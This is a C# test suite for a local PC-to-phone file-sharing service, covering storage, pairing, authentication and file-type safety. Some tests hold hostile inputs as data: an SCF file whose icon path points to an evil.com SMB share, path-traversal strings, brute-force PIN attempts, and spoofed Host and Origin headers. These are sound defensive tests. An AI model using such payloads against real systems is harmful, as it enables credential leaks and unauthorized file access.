using System.IO.Compression;
using System.Net;
using System.Text;
using System.Text.Json;
using Filee.App.Services.Connect;
using Microsoft.Extensions.Logging.Abstractions;

namespace Filee.App.Tests;

public sealed class FileeConnectTests : IDisposable
{
    private readonly string _storageDir;
    private readonly string _tempDir;
    private readonly SharedFolderManager _manager;

    public FileeConnectTests()
    {
        var baseDir = Path.Combine(Path.GetTempPath(), "FileeConnectTests_" + Guid.NewGuid().ToString("N"));
        _storageDir = Path.Combine(baseDir, "Storage");
        _tempDir = Path.Combine(baseDir, "Temp");
        _manager = new SharedFolderManager(NullLogger<SharedFolderManager>.Instance, _storageDir, _tempDir);
        _manager.Initialize();
    }

    public void Dispose()
    {
        try
        {
            var parent = Path.GetDirectoryName(_storageDir);
            if (parent != null && Directory.Exists(parent))
                Directory.Delete(parent, recursive: true);
        }
        catch
        {
            // Ignore cleanup failures
        }
    }

    [Fact]
    public void Manager_initializes_empty_folder_and_reports_full_free_space()
    {
        var items = _manager.GetFiles();
        Assert.Empty(items);
        Assert.Equal(SharedFolderManager.MaxTotalStorage, _manager.StorageLimitRemaining);
    }

    [Fact]
    public async Task Save_file_persists_content_and_retrieves_item()
    {
        var content = "Hello Filee Connect!";
        using var stream = new MemoryStream(Encoding.UTF8.GetBytes(content));

        var item = await _manager.SaveStreamAsync(stream, "test.txt", "test.txt", "pc", "text/plain");

        Assert.NotNull(item);
        Assert.Equal("test.txt", item.Name);
        Assert.Equal(content.Length, item.Size);
        Assert.True(File.Exists(item.DiskPath));
        Assert.Equal(content, File.ReadAllText(item.DiskPath));

        var files = _manager.GetFiles();
        Assert.Single(files);
        Assert.Equal("test.txt", files[0].Name);
    }

    [Fact]
    public async Task Delete_removes_file_and_updates_free_space()
    {
        using var stream = new MemoryStream(new byte[1024]);
        var item = await _manager.SaveStreamAsync(stream, "to-delete.bin", "to-delete.bin", "mobile", "application/octet-stream");

        var beforeDelete = _manager.GetFiles();
        Assert.Single(beforeDelete);

        var deleted = _manager.DeleteFile(item.Id);
        Assert.True(deleted);

        var afterDelete = _manager.GetFiles();
        Assert.Empty(afterDelete);
        Assert.Equal(SharedFolderManager.MaxTotalStorage, _manager.StorageLimitRemaining);
    }

    [Fact]
    public async Task WriteFolderZip_packages_folder_content_correctly()
    {
        var textContent = "File inside ZIP";
        using var stream = new MemoryStream(Encoding.UTF8.GetBytes(textContent));
        await _manager.SaveStreamAsync(stream, "doc.txt", "subfolder/doc.txt", "pc", "text/plain");

        using var zipStream = new MemoryStream();
        _manager.WriteFolderZip("subfolder", zipStream);
        zipStream.Position = 0;

        using var archive = new ZipArchive(zipStream, ZipArchiveMode.Read);
        var entry = archive.Entries.FirstOrDefault(e => e.Name == "doc.txt");
        Assert.NotNull(entry);

        using var reader = new StreamReader(entry.Open(), Encoding.UTF8);
        Assert.Equal(textContent, reader.ReadToEnd());
    }

    [Fact]
    public async Task WriteFolderZipAsync_packages_folder_content_correctly()
    {
        var textContent = "Async ZIP streaming content";
        using var stream = new MemoryStream(Encoding.UTF8.GetBytes(textContent));
        await _manager.SaveStreamAsync(stream, "async_doc.txt", "sub/async_doc.txt", "pc", "text/plain");

        using var zipStream = new MemoryStream();
        await _manager.WriteFolderZipAsync("sub", zipStream, TestContext.Current.CancellationToken);
        zipStream.Position = 0;

        using var archive = new ZipArchive(zipStream, ZipArchiveMode.Read);
        var entry = archive.Entries.FirstOrDefault(e => e.Name == "async_doc.txt");
        Assert.NotNull(entry);

        using var reader = new StreamReader(entry.Open(), Encoding.UTF8);
        Assert.Equal(textContent, await reader.ReadToEndAsync(TestContext.Current.CancellationToken));
    }

    [Fact]
    public async Task Off_allowlist_files_are_stored_with_bin_extension_on_disk()
    {
        var scfContent = "[Shell]\r\nCommand=2\r\nIconFile=\\\\evil.com\\share";
        using var stream = new MemoryStream(Encoding.UTF8.GetBytes(scfContent));
        var item = await _manager.SaveStreamAsync(stream, "malicious.scf", "malicious.scf", "mobile", "text/plain");

        Assert.NotNull(item);
        Assert.Equal("malicious.scf", item.Name);
        Assert.EndsWith(".bin", item.DiskPath, StringComparison.OrdinalIgnoreCase);
        Assert.True(File.Exists(item.DiskPath));
    }

    [Fact]
    public void Path_traversal_throws_argument_exception()
    {
        Assert.Throws<ArgumentException>(() => SharedFolderManager.CleanRelativePath("../../Windows/System32/calc.exe"));
        Assert.Throws<ArgumentException>(() => SharedFolderManager.CleanRelativePath("../secret.txt"));
        Assert.Throws<ArgumentException>(() => SharedFolderManager.CleanRelativePath(""));
    }

    [Fact]
    public void Manifest_resources_contain_connect_assets()
    {
        var asm = typeof(FileeConnectService).Assembly;
        var names = asm.GetManifestResourceNames();
        Assert.Contains(names, n => n.EndsWith("mobile.html", StringComparison.OrdinalIgnoreCase));
        Assert.Contains(names, n => n.EndsWith("app.css", StringComparison.OrdinalIgnoreCase));
        Assert.Contains(names, n => n.EndsWith("mobile.js", StringComparison.OrdinalIgnoreCase));
        Assert.Contains(names, n => n.EndsWith("shared-files.js", StringComparison.OrdinalIgnoreCase));
    }

    [Fact]
    public async Task StartSessionAsync_starts_kestrel_and_serves_mobile_html()
    {
        var service = new FileeConnectService(NullLogger<FileeConnectService>.Instance, _manager);
        await service.StartSessionAsync();
        try
        {
            Assert.NotNull(service.MobileUrl);

            using var http = new HttpClient();
            var response = await http.GetAsync(service.MobileUrl, TestContext.Current.CancellationToken);
            var body = await response.Content.ReadAsStringAsync(TestContext.Current.CancellationToken);
            Assert.True(response.IsSuccessStatusCode, $"Failed to fetch {service.MobileUrl}: {response.StatusCode} Body: {body}");
            Assert.Contains("Filee Connect", body);
            Assert.Contains("/app.css", body);
        }
        finally
        {
            await service.StopSessionAsync();
        }
    }

    [Fact]
    public async Task Pairing_with_invalid_secret_returns_404()
    {
        var service = new FileeConnectService(NullLogger<FileeConnectService>.Instance, _manager);
        await service.StartSessionAsync();
        try
        {
            using var http = new HttpClient();
            var invalidUrl = service.MobileUrl!.Replace(service.PairingSecret!, "invalidsecret1234");
            var response = await http.GetAsync(invalidUrl, TestContext.Current.CancellationToken);
            Assert.Equal(HttpStatusCode.NotFound, response.StatusCode);
        }
        finally
        {
            await service.StopSessionAsync();
        }
    }

    [Fact]
    public async Task Unauthenticated_api_request_returns_401()
    {
        var service = new FileeConnectService(NullLogger<FileeConnectService>.Instance, _manager);
        await service.StartSessionAsync();
        try
        {
            using var http = new HttpClient();
            var uri = new Uri(service.MobileUrl!);
            var apiUrl = $"{uri.Scheme}://{uri.Authority}/api/history";
            var response = await http.GetAsync(apiUrl, TestContext.Current.CancellationToken);
            Assert.Equal(HttpStatusCode.Unauthorized, response.StatusCode);
        }
        finally
        {
            await service.StopSessionAsync();
        }
    }

    [Fact]
    public async Task Pin_pairing_succeeds_and_consumes_pin()
    {
        var service = new FileeConnectService(NullLogger<FileeConnectService>.Instance, _manager);
        await service.StartSessionAsync();
        try
        {
            using var http = new HttpClient();
            var uri = new Uri(service.MobileUrl!);
            var pairUrl = $"{uri.Scheme}://{uri.Authority}/api/pair/pin";

            var initialPin = service.CurrentPin;
            var payload = new { pin = initialPin, deviceName = "TestPhone" };
            var content = new StringContent(JsonSerializer.Serialize(payload), Encoding.UTF8, "application/json");

            var response = await http.PostAsync(pairUrl, content, TestContext.Current.CancellationToken);
            Assert.Equal(HttpStatusCode.OK, response.StatusCode);

            var body = await response.Content.ReadAsStringAsync(TestContext.Current.CancellationToken);
            using var doc = JsonDocument.Parse(body);
            Assert.True(doc.RootElement.TryGetProperty("token", out var tokenProp));
            Assert.False(string.IsNullOrWhiteSpace(tokenProp.GetString()));

            // PIN should be consumed and refreshed immediately
            Assert.NotEqual(initialPin, service.CurrentPin);
        }
        finally
        {
            await service.StopSessionAsync();
        }
    }

    [Fact]
    public async Task Pin_pairing_locks_out_after_5_failed_attempts()
    {
        var service = new FileeConnectService(NullLogger<FileeConnectService>.Instance, _manager);
        await service.StartSessionAsync();
        try
        {
            using var http = new HttpClient();
            var uri = new Uri(service.MobileUrl!);
            var pairUrl = $"{uri.Scheme}://{uri.Authority}/api/pair/pin";

            HttpResponseMessage? lastResponse = null;
            for (var i = 0; i < 5; i++)
            {
                var payload = new { pin = "000000", deviceName = "AttackerPhone" };
                var content = new StringContent(JsonSerializer.Serialize(payload), Encoding.UTF8, "application/json");
                lastResponse = await http.PostAsync(pairUrl, content, TestContext.Current.CancellationToken);
            }

            Assert.NotNull(lastResponse);
            Assert.Equal(HttpStatusCode.TooManyRequests, lastResponse.StatusCode);
        }
        finally
        {
            await service.StopSessionAsync();
        }
    }

    [Fact]
    public async Task Host_header_mismatch_is_rejected_as_bad_request()
    {
        var service = new FileeConnectService(NullLogger<FileeConnectService>.Instance, _manager);
        await service.StartSessionAsync();
        try
        {
            using var http = new HttpClient();
            var req = new HttpRequestMessage(HttpMethod.Get, service.MobileUrl);
            req.Headers.Host = "evil.example:3000";

            var response = await http.SendAsync(req, TestContext.Current.CancellationToken);
            Assert.Equal(HttpStatusCode.BadRequest, response.StatusCode);
        }
        finally
        {
            await service.StopSessionAsync();
        }
    }

    [Fact]
    public async Task Qr_pairing_secret_is_single_use_and_redirects()
    {
        var service = new FileeConnectService(NullLogger<FileeConnectService>.Instance, _manager);
        await service.StartSessionAsync();
        try
        {
            using var handler = new HttpClientHandler { AllowAutoRedirect = false };
            using var http = new HttpClient(handler);

            var firstResponse = await http.GetAsync(service.MobileUrl, TestContext.Current.CancellationToken);
            Assert.Equal(HttpStatusCode.Redirect, firstResponse.StatusCode);
            Assert.Equal("/mobile", firstResponse.Headers.Location?.OriginalString);

            // Verify Set-Cookie header contains filee_token and is HttpOnly
            Assert.True(firstResponse.Headers.TryGetValues("Set-Cookie", out var cookies));
            var cookieStr = string.Join("; ", cookies);
            Assert.Contains("filee_token=", cookieStr);
            Assert.Contains("httponly", cookieStr, StringComparison.OrdinalIgnoreCase);

            // Second request with same URL must 404 because secret was consumed atomically on first pair
            var secondResponse = await http.GetAsync(service.MobileUrl, TestContext.Current.CancellationToken);
            Assert.Equal(HttpStatusCode.NotFound, secondResponse.StatusCode);
        }
        finally
        {
            await service.StopSessionAsync();
        }
    }

    [Fact]
    public async Task Http_folder_zip_download_streams_valid_zip_archive()
    {
        var service = new FileeConnectService(NullLogger<FileeConnectService>.Instance, _manager);
        await service.StartSessionAsync();
        try
        {
            var uri = new Uri(service.MobileUrl!);
            var baseAuthority = $"{uri.Scheme}://{uri.Authority}";

            // 1. Pair device via PIN to obtain auth token
            using var http = new HttpClient();
            var pairResponse = await http.PostAsync($"{baseAuthority}/api/pair/pin",
                new StringContent(JsonSerializer.Serialize(new { pin = service.CurrentPin, deviceName = "TestDevice" }), Encoding.UTF8, "application/json"),
                TestContext.Current.CancellationToken);
            Assert.Equal(HttpStatusCode.OK, pairResponse.StatusCode);
            var pairJson = JsonDocument.Parse(await pairResponse.Content.ReadAsStringAsync(TestContext.Current.CancellationToken));
            var token = pairJson.RootElement.GetProperty("token").GetString()!;

            // 2. Add files to shared folder
            using var stream = new MemoryStream(Encoding.UTF8.GetBytes("Zip streaming test content"));
            await _manager.SaveStreamAsync(stream, "test.txt", "test.txt", "pc", "text/plain");

            // 3. Request folder zip with Authorization header
            using var req = new HttpRequestMessage(HttpMethod.Get, $"{baseAuthority}/api/folder.zip");
            req.Headers.Authorization = new System.Net.Http.Headers.AuthenticationHeaderValue("Bearer", token);
            var zipResponse = await http.SendAsync(req, TestContext.Current.CancellationToken);
            Assert.Equal(HttpStatusCode.OK, zipResponse.StatusCode);

            // 4. Verify stream unpacks as valid zip archive
            var zipBytes = await zipResponse.Content.ReadAsByteArrayAsync(TestContext.Current.CancellationToken);
            using var mem = new MemoryStream(zipBytes);
            using var archive = new ZipArchive(mem, ZipArchiveMode.Read);
            Assert.Contains(archive.Entries, e => e.Name == "test.txt");
        }
        finally
        {
            await service.StopSessionAsync();
        }
    }

    [Fact]
    public async Task Http_upload_over_64kb_succeeds_for_authenticated_client()
    {
        var service = new FileeConnectService(NullLogger<FileeConnectService>.Instance, _manager);
        await service.StartSessionAsync();
        try
        {
            var uri = new Uri(service.MobileUrl!);
            var baseAuthority = $"{uri.Scheme}://{uri.Authority}";

            // 1. Pair device via PIN
            using var http = new HttpClient();
            var pairResponse = await http.PostAsync($"{baseAuthority}/api/pair/pin",
                new StringContent(JsonSerializer.Serialize(new { pin = service.CurrentPin, deviceName = "TestDevice" }), Encoding.UTF8, "application/json"),
                TestContext.Current.CancellationToken);
            Assert.Equal(HttpStatusCode.OK, pairResponse.StatusCode);
            var pairJson = JsonDocument.Parse(await pairResponse.Content.ReadAsStringAsync(TestContext.Current.CancellationToken));
            var token = pairJson.RootElement.GetProperty("token").GetString()!;

            // 2. Create payload over 64 KB (128 KB)
            var largePayload = new byte[128 * 1024];
            Array.Fill(largePayload, (byte)'A');

            using var form = new MultipartFormDataContent();
            var fileContent = new ByteArrayContent(largePayload);
            fileContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/octet-stream");
            form.Add(fileContent, "file", "large_file.bin");
            form.Add(new StringContent("large_file.bin"), "relativePath");

            using var uploadReq = new HttpRequestMessage(HttpMethod.Post, $"{baseAuthority}/api/upload")
            {
                Content = form
            };
            uploadReq.Headers.Authorization = new System.Net.Http.Headers.AuthenticationHeaderValue("Bearer", token);

            var uploadResponse = await http.SendAsync(uploadReq, TestContext.Current.CancellationToken);
            Assert.Equal(HttpStatusCode.OK, uploadResponse.StatusCode);
        }
        finally
        {
            await service.StopSessionAsync();
        }
    }

    [Fact]
    public async Task Http_upload_without_token_is_rejected_unauthorized()
    {
        var service = new FileeConnectService(NullLogger<FileeConnectService>.Instance, _manager);
        await service.StartSessionAsync();
        try
        {
            var uri = new Uri(service.MobileUrl!);
            var baseAuthority = $"{uri.Scheme}://{uri.Authority}";

            var largePayload = new byte[128 * 1024];
            using var form = new MultipartFormDataContent();
            form.Add(new ByteArrayContent(largePayload), "file", "large.bin");

            using var http = new HttpClient();
            var response = await http.PostAsync($"{baseAuthority}/api/upload", form, TestContext.Current.CancellationToken);
            Assert.Equal(HttpStatusCode.Unauthorized, response.StatusCode);
        }
        finally
        {
            await service.StopSessionAsync();
        }
    }

    [Fact]
    public async Task WebSocket_request_with_mismatched_origin_is_rejected_forbidden()
    {
        var service = new FileeConnectService(NullLogger<FileeConnectService>.Instance, _manager);
        await service.StartSessionAsync();
        try
        {
            var uri = new Uri(service.MobileUrl!);
            var baseAuthority = $"{uri.Scheme}://{uri.Authority}";

            using var http = new HttpClient();
            var req = new HttpRequestMessage(HttpMethod.Get, $"{baseAuthority}/ws");
            req.Headers.TryAddWithoutValidation("Upgrade", "websocket");
            req.Headers.TryAddWithoutValidation("Connection", "Upgrade");
            req.Headers.TryAddWithoutValidation("Sec-WebSocket-Key", "dGhlIHNhbXBsZSBub25jZQ==");
            req.Headers.TryAddWithoutValidation("Sec-WebSocket-Version", "13");
            req.Headers.TryAddWithoutValidation("Origin", "http://evil.example.com");

            var response = await http.SendAsync(req, TestContext.Current.CancellationToken);
            Assert.Equal(HttpStatusCode.Forbidden, response.StatusCode);
        }
        finally
        {
            await service.StopSessionAsync();
        }
    }

    [Fact]
    public void FileExecutionSafety_correctly_filters_dangerous_files()
    {
        Assert.True(FileExecutionSafety.IsSafeToOpenDirectly("photo.jpg"));
        Assert.True(FileExecutionSafety.IsSafeToOpenDirectly("document.pdf"));
        Assert.True(FileExecutionSafety.IsSafeToOpenDirectly("readme.txt"));
        Assert.True(FileExecutionSafety.IsSafeToOpenDirectly("movie.mp4"));

        Assert.False(FileExecutionSafety.IsSafeToOpenDirectly("vector.svg"));
        Assert.False(FileExecutionSafety.IsSafeToOpenDirectly("config.xml"));
        Assert.False(FileExecutionSafety.IsSafeToOpenDirectly("shortcut.scf"));
        Assert.False(FileExecutionSafety.IsSafeToOpenDirectly("virus.exe"));
        Assert.False(FileExecutionSafety.IsSafeToOpenDirectly("script.bat"));
        Assert.False(FileExecutionSafety.IsSafeToOpenDirectly("malware.ps1"));
        Assert.False(FileExecutionSafety.IsSafeToOpenDirectly("payload.sh"));
        Assert.False(FileExecutionSafety.IsSafeToOpenDirectly("unknown.bin"));
    }
}
